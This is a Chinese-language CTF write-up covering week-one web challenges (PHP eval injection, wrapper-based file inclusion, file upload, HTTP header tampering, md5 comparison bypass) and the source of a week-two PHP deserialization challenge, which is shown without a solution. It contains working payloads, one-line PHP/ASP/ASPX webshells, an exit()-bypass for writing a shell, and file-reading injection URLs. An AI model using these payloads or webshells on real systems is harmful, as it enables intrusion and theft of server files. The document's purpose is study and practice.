部分week3和week4的题目看了wp也没看懂怎么回事 所以没能复现出来

复现过程中涉及到的知识点都附在了复现过程的后面

# week1
## 喵喵喵
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1730730326969-a3466ef4-7a46-468d-a4b6-ab15c934a873.png)

本题利用php代码中的eval()函数漏洞 通过get方式传入php代码来获取flag

构建payload：

```plain
http://gz.imxbt.cn:20342/?DT=echo file_get_contents('/flag');
```

除此之外还可以利用system函数可以执行shell命令来寻找flag

payload如下：

```plain
http://gz.imxbt.cn:20342/?DT=system('cat /flag');
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1730772939983-3879f4b7-45d3-4938-a033-a6f6f8e800e7.png)

注意：php中eval函数漏洞只能执行php代码，而使用shell命令需要借助system函数，并且传入的php代码必须以分号结尾。

扩展：若传入的参数在eval函数内的所要执行的函数，我们可闭合括号并输入分号构建多条php语句来执行所需命令。

例如：假设将下列代码替换成题中的eval函数语句

```plain
 eval("var_dump($a);");
```

通过闭合括号和添加分号构建payload

```plain
?DT=);echo file_get_contents('/flag');var_dump(
```

通过闭合括号构建php语句以实现绕过eval函数内的函数执行php语句

## Aura 酱的礼物
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731408028995-b9edb8bc-161d-4f09-a5a0-e54cb45f2097.png)

通过代码审计需要经过三次判断



首先对于第一个判断, 他需要读取一个文件后内容是'Aura'，我们可以尝试通过<font style="color:#601BDE;">data://</font> <font style="color:#000000;">伪协议来进行读取</font>

<font style="color:#000000;">第二个判断的话, 我们要求页面的开头为</font>[http://jasmineaura.github.io](http://jasmineaura.github.io)

我们可以利用 <font style="color:#601BDE;">@</font>来进行隔断, 将<font style="color:#601BDE;">@</font>前面的内容当做用户名 （参考[链接]( https://cloud.tencent.com/developer/article/2288231)）

<font style="color:#000000;">而我们需要页面的内容存在这个字符串, 我们可以就利用当前页面来显示, 于是构造</font>

```plain
URL 的格式为 scheme://user:password@address:port/path?query#fragment
http://jasmineaura.github.io@127.0.0.1?query#已经收到Kengwang的礼物啦
```



第三个的话是一个 include 点, 由于我们的 flag 在注释部分, 我们需要将其伪协议和过滤器来进行 base64 编码后输出

```plain
php://filter/convert.base64-encode/resource=flag.php
```

最后的payload为

```plain
pen=data://text/plain;base64,QXVyYQ==
challenge=http://jasmineaura.github.io@127.0.0.1?query#已经收到Kengwang的礼物啦
gift=php://filter/convert.base64-encode/resource=flag.php
```

利用HackBar插件POST参数

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731479347348-42b6ae4a-fcea-48f6-a95e-b3b86b46d84e.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731479367493-f90ce832-37fc-496b-a76f-d83aaa43ecd7.png)

最后将密文解码就可得到flag



### 关于PHP常见伪协议的使用
<font style="color:rgb(77, 77, 77);">php支持的伪协议有：</font>

```plain
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
```

这里只介绍几种常见伪协议的用法

#### 1、php://filter
**<font style="color:rgb(77, 77, 77);">php://filter</font>**<font style="color:rgb(77, 77, 77);"> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</font>

<font style="color:rgb(77, 77, 77);">简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</font>

**<font style="color:rgb(77, 77, 77);">php://filter</font>**<font style="color:rgb(77, 77, 77);">可以获取指定文件源码。当它与包含函数结合时，</font>**<font style="color:rgb(77, 77, 77);">php://filter</font>**<font style="color:rgb(77, 77, 77);">流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</font>

<font style="color:rgb(77, 77, 77);">协议参数</font>

| 名称 | 描述 |
| --- | --- |
| resource=<要过滤的数据流> | <font style="color:rgb(79, 79, 79);">这个参数是必须的。它指定了你要筛选过滤的数据流。</font> |
| read=<读链的筛选列表> | 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 |
| write=<写链的筛选列表> | 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 |
| <；两个链的筛选列表> | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |


<font style="color:rgb(77, 77, 77);">常用：</font>

```plain
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
```

<font style="color:rgb(77, 77, 77);">利用filter协议读文件，将index.php通过</font><font style="color:rgb(78, 161, 219) !important;">base64</font><font style="color:rgb(77, 77, 77);">编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。使用的convert.base64-encode，就是一种过滤器。</font>

##### <font style="color:rgb(77, 77, 77);">利用filter伪协议绕过exit</font>
###### <font style="color:rgb(77, 77, 77);">什么是exit</font>
<font style="color:rgb(77, 77, 77);">exit指的是在进行写入PHP文件操作时，执行了以下函数：</font>

```plain
file_put_contents($content, '<?php exit();' . $content);
```

<font style="color:rgb(77, 77, 77);">亦或者</font>

```plain
file_put_contents($content, '<?php exit();?>' . $content);
```

<font style="color:rgb(77, 77, 77);">这样，当你插入一句话木马时，文件的内容是这样子的：</font>

```plain
<?php exit();?>

<?php @eval($_POST['snakin']);?>
```

<font style="color:rgb(77, 77, 77);">这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。</font>

###### <font style="color:rgb(77, 77, 77);">base64decode绕过</font>
<font style="color:rgb(77, 77, 77);">利用filter协议来绕过，看下这样的代码：</font>

```plain
<?php

$content = '<?php exit; ?>';

$content .= $_POST['txt'];

file_put_contents($_POST['filename'], $content);
```

<font style="color:#000000;">当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。</font>

<font style="color:#000000;">然而这里可以利用php://filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除exit。</font>

<font style="color:rgb(77, 77, 77);">base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：</font>

```plain
<?php

$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);

base64_decode($_GET['txt']);
```

<font style="color:rgb(77, 77, 77);">所以，当</font><font style="color:#601BDE;">$content</font><font style="color:#000000;">包含</font><font style="color:#601BDE;"><?php exit;?></font><font style="color:rgb(77, 77, 77);">时，解码过程会先去除识别不了的字符，< ; ? >和空格等都将被去除，于是剩下的字符就只有</font><font style="color:#601BDE;">phpexit</font><font style="color:rgb(77, 77, 77);">以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符'a'后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。</font>

<font style="color:rgb(77, 77, 77);">这个时候后面再加上编码后的一句话木马，就可以getshell了。</font>

###### <font style="color:rgb(79, 79, 79);">strip_tags绕过</font>
<font style="color:rgb(77, 77, 77);">这个</font><font style="color:#601BDE;"><?php exit;?></font><font style="color:rgb(77, 77, 77);">实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</font>

<font style="color:rgb(77, 77, 77);">但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。</font>

<font style="color:rgb(77, 77, 77);">注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。</font>

```plain
php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
```

<font style="color:rgb(77, 77, 77);">更多绕过方法：</font>[file_put_content和死亡·杂糅代码之缘 - 先知社区](https://xz.aliyun.com/t/8163?time__1311=n4%2BxnD0Dc7GQ0%3DDCDgADlhjm57ITj2GD0I2q%3Dx#toc-2)

#### <font style="color:rgb(79, 79, 79);">2、data://</font>
<font style="color:rgb(77, 77, 77);">数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</font>

<font style="color:rgb(77, 77, 77);">示例用法</font>

```plain
1、data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

```

除GET方法外POST同样也可以

例如题目中的

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731479347348-42b6ae4a-fcea-48f6-a95e-b3b86b46d84e.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0)

#### 3、file://
<font style="color:rgb(77, 77, 77);">用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响</font>  
<font style="color:rgb(77, 77, 77);">file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)</font>  
<font style="color:rgb(77, 77, 77);">比如：http://www.xx.com?file=file:///etc/passsword</font>

#### <font style="color:rgb(77, 77, 77);">4、php://</font>
<font style="color:rgb(77, 77, 77);">在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用</font>  
<font style="color:rgb(77, 77, 77);">php://作用为访问输入输出流</font>

#### <font style="color:rgb(77, 77, 77);">5、php://input</font>
**<font style="color:rgb(77, 77, 77);">php://input</font>**<font style="color:rgb(77, 77, 77);">可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</font>

<font style="color:rgb(77, 77, 77);">例如：</font>

[http://127.0.0.1/cmd.php?cmd=php://input](http://127.0.0.1/cmd.php?cmd=php://input)

<font style="color:rgb(77, 77, 77);">POST数据：<?php phpinfo()?></font>

<font style="color:rgb(77, 77, 77);">注意：</font>

<font style="color:rgb(77, 77, 77);">当enctype="multipart/form-data"的时候 php://input` 是无效的</font>

<font style="color:rgb(77, 77, 77);">遇到file_get_contents()要想到用php://input绕过</font>

#### <font style="color:rgb(79, 79, 79);">6 zip://</font>
<font style="color:rgb(77, 77, 77);">zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</font>

```plain
zip://中只能传入绝对路径。
要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
只需要是zip的压缩包即可，后缀名可以任意更改。
相同的类型的还有zlib://和bzip2://
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731483456000-93f8731c-4a4f-4866-9998-a2419b397385.png)

本文参考链接[链接](https://blog.csdn.net/cosmoslin/article/details/120695429?ops_request_misc=%257B%2522request%255Fid%2522%253A%252228579CCC-1D95-4F8C-AEA8-738D2D0C590C%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=28579CCC-1D95-4F8C-AEA8-738D2D0C590C&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120695429-null-null.142^v100^pc_search_result_base7&utm_term=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&spm=1018.2226.3001.4187)

## Upload
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731398403979-ba2679e5-7618-40f1-a454-d2e05927782d.png)

题目名Upload提示上传任意文件 这里我们需要上传一句话木马并通过中国蚁剑连接从而查找隐藏在网站根目录下的flag

首先 创建并编写一句话木马文件

在桌面上新建一个文本文件并修改文件名称及文件后缀名为php

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731399637828-7baa0ff5-3dcf-4d58-8908-70a4b09b285c.png)

编辑文本内容后保存

```plain
<?php @eval($_POST[0]);?>
```

将文件上传

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731399790321-5d883e04-a424-411d-a84a-6c839c80a2b5.png)

根据代码审计文件上传到了'uploads/$file'下

打开中国蚁剑测试连接

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731400022279-b77a7739-22b2-419a-9a9b-65014bce9a1e.png)

测试连接成功后进入根目录查找flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731400130584-18e3fc26-9276-4bc9-8d5f-3e052816d211.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731400143627-b4e92f89-2e1e-49a7-946c-dc8d466a3353.png)

### 关于一句话木马：
主要参考文章：[链接](https://blog.csdn.net/weixin_39190897/article/details/86772765?ops_request_misc=%257B%2522request%255Fid%2522%253A%252209B31737-A115-41DD-BFCA-63527FE4A2BF%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=09B31737-A115-41DD-BFCA-63527FE4A2BF&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-86772765-null-null.142^v100^pc_search_result_base7&utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%ACphp%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&spm=1018.2226.3001.4187)

#### <font style="color:rgb(79, 79, 79);">概述：</font>
<font style="color:rgb(77, 77, 77);">在很多的渗透过程中，渗透人员会上传一句话木马（</font>**<font style="color:rgb(77, 77, 77);">简称Webshell</font>**<font style="color:rgb(77, 77, 77);">）到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此</font>

<font style="color:rgb(77, 77, 77);">先来看看最简单的一句话木马：</font>

```plain
   <?php @eval($_POST['attack']);?>
```

【基本原理】利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀或中国蚁剑即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST['attack']表示从页面中获得attack这个参数值。

#### <font style="color:rgb(79, 79, 79);">入侵条件：</font>
<font style="color:rgb(77, 77, 77);">其中，只要攻击者满足三个条件，就能实现成功入侵：</font>

```plain
木马上传成功，未被杀；
知道木马的路径在哪；
上传的木马能正常运行。
```

#### <font style="color:rgb(79, 79, 79);">常见形式：</font>
<font style="color:rgb(77, 77, 77);">常见的一句话木马：</font>

```plain
php的一句话木马： <?php @eval($_POST['pass']);?>
asp的一句话是：   <%eval request ("pass")%>
aspx的一句话是：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
```

<font style="color:rgb(77, 77, 77);">我们可以直接将这些语句插入到网站上的某个asp/aspx/php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。</font>

#### <font style="color:rgb(79, 79, 79);">基本原理：</font>
<font style="color:rgb(77, 77, 77);">首先我们先看一个原始而又简单的php一句话木马：</font>

```plain
   <?php @eval($_POST['cmd']); ?>
```

<font style="color:rgb(77, 77, 77);">这是php的一句话后门中最普遍的一种。它的工作原理是：</font>  
<font style="color:rgb(77, 77, 77);">首先存在一个名为'cmd'的变量，'cmd'的取值为HTTP的POST方式。Web服务器对'cmd'取值以后，然后通过eval()函数执行'cmd'里面的内容。</font>

### <font style="color:rgb(77, 77, 77);">关于中国蚁剑的安装与使用：</font>
#### 安装：
安装过程可以参考[链接](https://blog.csdn.net/qq_60450539/article/details/138398460?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522080FB7DF-06C1-4710-A677-B0E2634E2829%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=080FB7DF-06C1-4710-A677-B0E2634E2829&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-138398460-null-null.142^v100^pc_search_result_base7&utm_term=%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B&spm=1018.2226.3001.4187)

#### 使用：
进入中国蚁剑首页 在空白处右键点击添加数据

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731405840127-a03dd4ec-39d1-4ebb-a090-ae0cef1569df.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731405892899-e6f4a6a1-2333-4cbb-9d78-b6f16267cec1.png)

输入相应的网址及webshell的位置 例如题目中的

```plain
url/uploads/eval.php
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731400022279-b77a7739-22b2-419a-9a9b-65014bce9a1e.png?x-oss-process=image%2Fformat%2Cwebp)

连接密码为一句话木马中所写的参数

点击测试连接 若连接成功 点击添加后数据会加载出来

## A Dark Room
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731396545219-4417eb90-3002-4e43-9091-2ddd99bd1476.png)

flag藏在源代码里面有 鼠标右键打开查看发现flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731396600033-65d5af7e-3127-4bab-a5cb-ccb176cd21f1.png)

#### 查看源代码的方式：
<font style="color:rgb(79, 79, 79);">1.右键选择检查 （或 F12 开发者工具）</font>

<font style="color:rgb(79, 79, 79);">2.view-source:url  （或 crtl+u）</font>

<font style="color:rgb(79, 79, 79);">3.bp抓包发送查看响应</font>

<font style="color:rgb(79, 79, 79);">4.访问根目录下的index.phps</font>

## <font style="color:rgb(79, 79, 79);">HTTP 是什么呀</font>
此题考察了我们对 HTTP 协议的理解

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731389978735-90186232-e215-4ccf-bd34-e64ae59c5acd.png)

需要我们利用抓包工具修改对应的需要的参数 我这里使用的是BurpSuite 

修改相关的参数信息

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731391202130-88a12fac-f6af-4ce3-a97e-c46becd7ed8f.png)

发送后在BurpSuite中查看响应包

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731391879128-82615dc4-dca0-4870-9e06-240b2137b4c6.png)

发现flag的是还需对其进行base64的解码

### 关于http协议
主要参考文章[链接](https://blog.csdn.net/loss_rose777/article/details/132919997?ops_request_misc=%257B%2522request%255Fid%2522%253A%25224C00C2EA-636D-42B4-8792-C71D17CBD090%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=4C00C2EA-636D-42B4-8792-C71D17CBD090&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-132919997-null-null.142^v100^pc_search_result_base7&utm_term=http%E5%8D%8F%E8%AE%AE&spm=1018.2226.3001.4187)

#### <font style="color:rgb(79, 79, 79);">URL基本介绍及基本格式：</font>
<font style="color:rgb(77, 77, 77);">平时我们上网的网址就是URL，互联网上的每一个文件都有一个统一的URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它</font>

<font style="color:rgb(77, 77, 77);">URL的标准格式如下：</font>

```plain
协议类型：[//服务器地址][:端口号][/资源层级UNIX文件路径]文件名[?查询字符串][#片段标识符]
```

<font style="color:rgb(77, 77, 77);">URL的完整格式如下：</font>

```plain
协议类型:[//[访问资源需要的凭证信息@]服务器地址[:端口号]][/资源层级 UNIX 文件路径]文件名[?查询字符串][#片段标识符]
```

#### <font style="color:rgb(79, 79, 79);">认识http协议方法</font>
<font style="color:rgb(77, 77, 77);">HTTP中的方法，就是</font>[<font style="color:rgb(77, 77, 77);">HTTP请求报文</font>](https://so.csdn.net/so/search?q=HTTP%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87&spm=1001.2101.3001.7020)<font style="color:rgb(77, 77, 77);">中的首行的第一部分。</font>

<font style="color:rgb(79, 79, 79);">虽然HTTP中的方法有很多，但是我们主要用到的只有两个GET和POST</font>

##### <font style="color:rgb(79, 79, 79);">GET方法:</font>
###### 基本介绍：
GET是常用的HTTP方法，常用于获取服务器的某个资源，以下几种方式都会触发GET方法的请求:

1、在浏览器中直接输入URL回车或者点击收藏夹中的链接，此时浏览器就会发送出一个GET请求

2、HTML中的link、img、script等标签的属性中放一个URL，浏览器也会构造出HTTP GET请求

3、使用Javascript中带你ajax，也能构造出HTTP GET请求

3、各种编程语言，只要能够访问网络，就能构造出HTTP GET请求

###### GET请求特点：
<font style="color:rgb(51, 51, 51);">1、首行里面第一部分就是GET</font>

<font style="color:rgb(51, 51, 51);">2、URL里面的 query string可以是空，也可以不是空</font>

<font style="color:rgb(51, 51, 51);">3、GET请求的header有若干个键值对结构</font>

<font style="color:rgb(51, 51, 51);">4、GET请求的body一般为空</font>

##### <font style="color:rgb(79, 79, 79);">POST方法：</font>
###### 基本介绍：
<font style="color:rgb(77, 77, 77);">POST方法也是一种常见的方法，用于提交用户输入的数据给服务器（如登陆界面）</font>

###### <font style="color:rgb(77, 77, 77);">POST请求的特点：</font>
1、首行第一部分就是POST

2、URL里面的query string一般是空的

3、POST请求的header中有若干个键值对

4、POST请求的body一般不为空（body的具体数据格式，由header中的Content-Type来描述；body的具体数据长度，由header中的Content-Length来描述） 

##### <font style="color:rgb(79, 79, 79);">GET和POST本质的区别：</font>
GET和POST本质是没有区别的，使用GET的场景完全可以使用POST代替，但是在具体的使用上，还是存在一些细节的区别：

1、GET习惯上会把客户端的数据通过query string来传输（body是空的）；POST习惯会把客户端数据通过body来传输（query string 是空的）

2、GET习惯上用于从服务器获取数据，POST习惯上是客户端给服务器提交数据

3、一般情况下，程序员会把GET请求的处理，是现成幂等的；对于POST请求的处理，不要是现成幂等的

4、GET请求可以被缓存，可以被浏览器保存到收藏夹中；POST请求不能被缓存

#### <font style="color:rgb(79, 79, 79);">认识请求报头</font>
<font style="color:rgb(77, 77, 77);">header整体格式是键值对结构，每一个键值对占一行，键和值之间使用”冒号+空格“进行分割</font>

<font style="color:rgb(77, 77, 77);">下面介绍几种常见的报头：</font>

###### <font style="color:rgb(79, 79, 79);">Host：</font>
<font style="color:rgb(77, 77, 77);">Host的值表示服务器主机的地址和端口（地址可以是域名，也可以是IP；端口号可以省略或者手动指定）</font>

###### <font style="color:rgb(79, 79, 79);">Content-Length：</font>
<font style="color:rgb(77, 77, 77);">Content-Length表示body的数据长度，长度单位是字节 以题目的数据包为例 body数据长度为9个字节</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731395156601-83b518e9-c0d7-4b25-9e44-e8f8f09d66ee.png)

###### <font style="color:rgb(79, 79, 79);">Content-Type：</font>
<font style="color:rgb(77, 77, 77);">Content-Type表示body的数据格式 常见的数据格式可以参考</font>[<font style="color:rgb(77, 77, 77);">链接</font>](https://blog.csdn.net/m0_71231013/article/details/125127289?ops_request_misc=%257B%2522request%255Fid%2522%253A%252292F2351D-39D2-45AF-A970-26CA08A8A032%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=92F2351D-39D2-45AF-A970-26CA08A8A032&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-125127289-null-null.142^v100^pc_search_result_base7&utm_term=Content-Type%E8%A1%A8%E7%A4%BAbody%E7%9A%84%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F&spm=1018.2226.3001.4187)

###### <font style="color:rgb(79, 79, 79);">User-Agent：</font>
<font style="color:rgb(77, 77, 77);">User-Agent表示浏览器或者操作系统的属性，简称UA 形如</font>

<font style="color:rgb(77, 77, 77);">Mozilla/5.0 (</font><font style="color:rgb(78, 161, 219) !important;">Windows</font><font style="color:rgb(77, 77, 77);"> NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/91.0.4472.77 Safari/537.36</font>

<font style="color:rgb(51, 51, 51);">其中</font>

<font style="color:rgb(78, 161, 219) !important;">Windows</font><font style="color:rgb(77, 77, 77);"> NT 10.0; Win64; x64</font><font style="color:rgb(51, 51, 51);"> 表示操作系统信息</font>

<font style="color:rgb(77, 77, 77);">AppleWebKit/537.36 (KHTML, like Gecko)Chrome/91.0.4472.77 Safari/537.36</font><font style="color:rgb(51, 51, 51);"> 表示浏览器信息</font>

###### <font style="color:rgb(79, 79, 79);">Referer：</font>
<font style="color:rgb(77, 77, 77);">Referer表示这个页面从哪个页面跳转过来的，这个是一个非常有用的字段</font>

<font style="color:rgb(77, 77, 77);">就比如我们在浏览器中搜索蛋糕，这个时候会跳出很多广告，这些广告是某些厂商投到某个浏览器的，当我们用搜狗点击的，搜狗就会获得这个钱，用百度点击百度就会获得，所以我们就可以根据Referer来判断我们上一个网页是百度还是搜狗</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731395708119-8b209d32-d468-47d8-8e8d-b98a66ea7635.png)

<font style="color:rgb(77, 77, 77);">我们对点击广告进行抓包，上面Referer就显示是从搜狗跳转过来的</font>

<font style="color:rgb(77, 77, 77);">注意： 如果直接在浏览器中输入 URL 或直接通过收藏夹访问页面时，是没有 Referer 的</font>

###### <font style="color:rgb(79, 79, 79);">Cookie：</font>
什么是Cookie？

<font style="color:rgb(77, 77, 77);">   Cookie是浏览器提供一种让程序员在本地存储数据的能力</font>

<font style="color:rgb(77, 77, 77);">为什么需要cookie？</font>

<font style="color:rgb(77, 77, 77);">  如果没有Cookie直接将要存储的数据保存到客户端浏览器所在的主机的硬盘上，就会出现很大的安全风险，比如当你不小心打开一个不安全的网站，该网站就可能在你的硬盘上写一个病毒程序，那么你的电脑可能就GG了！因此浏览器可能为了保证安全性，就会禁止网页中代码访问主机硬盘（无法在JS中读写文件），因此也就失去持久化存储能力，所以Cookie就是为了解决这个问题</font>

<font style="color:rgb(77, 77, 77);">Cookie里面存储的是什么？</font>

  <font style="color:rgb(77, 77, 77);">Cookie中存储的是一个字符串，是键值对结构的，键值对之间使用 ；尽心分割，键和值之间使用=进行分割</font>

## md5绕过欸
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1730776723308-4afebe20-1728-4fa9-b477-a049aa2618ac.png)

php代码审计以get方式传入参数name name2 以post方式分别传入参数 password password2

进行两轮验证 验证成功后输出flag

第一轮：name!=password 并且两参数md5加密后弱比较

第二轮：namw2!=password2 并且两参数md5加密后强比较

### 弱比较：
分为”与字符串类型比较“和”与int类型比较“

举例如下：

```plain
var_dump(“123a”==123)  //与int类型比较      结果为true
var_dump(“123a”==“123”) //与字符串类型比较    结果为false
```

#### <font style="color:rgb(79, 79, 79);">字符串与int类型比较:</font>
<font style="color:rgb(77, 77, 77);">PHP规定当进行“字符串与数字的若比较时”，会进行如下步骤：</font>

<font style="color:rgb(77, 77, 77);">先看字符串开头是否为数字，如果为数字，则截止到连续数字的最后一个数字，即"123abc456"=>123</font>

<font style="color:rgb(77, 77, 77);">如果开头不为数字，则判断为false，即0。因此</font>

```plain
("aaa123"==0) =>true
("123a"==123) =>true
```

思维导图：

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1730788948037-043325d4-79b5-456a-987f-05a102f586c9.png)

#### <font style="color:rgb(79, 79, 79);">字符串与字符串比较：</font>
<font style="color:rgb(77, 77, 77);">因为这个是字符串之间进行比较，想要绕过这个弱比较只能用</font><font style="color:#DF2A3F;background-color:#FBDE28;">0e</font><font style="color:rgb(77, 77, 77);">的方式。</font>

<font style="color:rgb(77, 77, 77);">在PHP中"0e"判断为科学计数法，0e123就是0乘以10的123次方</font>

<font style="color:rgb(77, 77, 77);">不难推出：</font><font style="color:rgb(77, 77, 77);background-color:#FBDE28;">0e123456789==0e1</font>

<font style="color:rgb(77, 77, 77);">不过有一个注意点：</font>

```plain
“0e123456”==“0e345” //True   
“0e12adfc”==“0e345” //False
在0e后面不能含有字母！！！ 否则判断为False
```

弱比较可以使用数组或是以下md5后开头为0e的字符串任意两个来绕过：

```plain
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
0e215962017
```

### 强比较：
如果遇到的是强比较最常见的绕过方法是<font style="background-color:#FBDE28;">数组绕过</font> <font style="background-color:#FFFFFF;">（弱比较也能用）</font>

<font style="color:rgb(77, 77, 77);">因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null=null，逻辑关系为True。</font>

<font style="color:rgb(77, 77, 77);">所以题目payload：</font>

```plain
/?name=QNKCDZO&name2[]=1
password=240610708&password2[]=2
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1730820572218-81ce14b4-6df8-476d-8b6e-490b5ef56306.png)

本文中的知识点参考[链接](https://blog.csdn.net/ma15848235278/article/details/134006134?ops_request_misc=&request_id=&biz_id=102&utm_term=md5%E5%8A%A0%E5%AF%86%E5%BC%B1%E6%AF%94%E8%BE%83%E5%92%8C%E5%BC%BA%E6%AF%94%E8%BE%83%E7%9A%84%E6%A6%82%E5%BF%B5%E2%80%99&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-134006134.142^v100^pc_search_result_base7&spm=1018.2226.3001.4187)

# week2
## EZ_ser
说是简单的反序列化 但是感觉不是很简单

题目代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;
    }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }

    public function getflag() {
        echo "you are over!";
    }
}
$ser = $_GET['ser'];
unserialize($ser);
?> 
```

